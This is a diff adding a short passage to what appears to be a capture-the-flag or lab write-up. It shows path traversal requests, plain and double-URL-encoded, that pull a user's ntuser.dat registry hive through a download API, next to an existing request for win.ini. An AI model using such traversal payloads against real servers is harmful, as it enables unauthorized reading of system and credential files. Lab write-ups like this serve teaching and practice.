@@ -666,6 +666,21 @@ python
 GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2577%2569%256e%2564%256f%2577%2573%255c%2577%2569%256e%252e%2569%256e%2569 HTTP/1.1
 ```
 
+
+
+we're authenticated as the
+ghostlink\svc_canary user, so we can attempt to download ntuser.dat from the user's profile and
+inspect it with regripper for any recently opened document
+
+```
+GET /api/download/..\..\..\..\..\..\..\users\svc_canary\ntuser.dat HTTP/1.1
+# Double URL Encoded
+GET
+/api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%
+252e%252e%255c%252e%252e%255c%2575%2573%2565%2572%2573%255c%2573%2576%2563%255f%2563%2561%
+256e%2561%2572%2579%255c%256e%2574%2575%2573%2565%2572%252e%2564%2561%2574 HTTP/1.1
+```
+
 ---
 ## Foothold
 
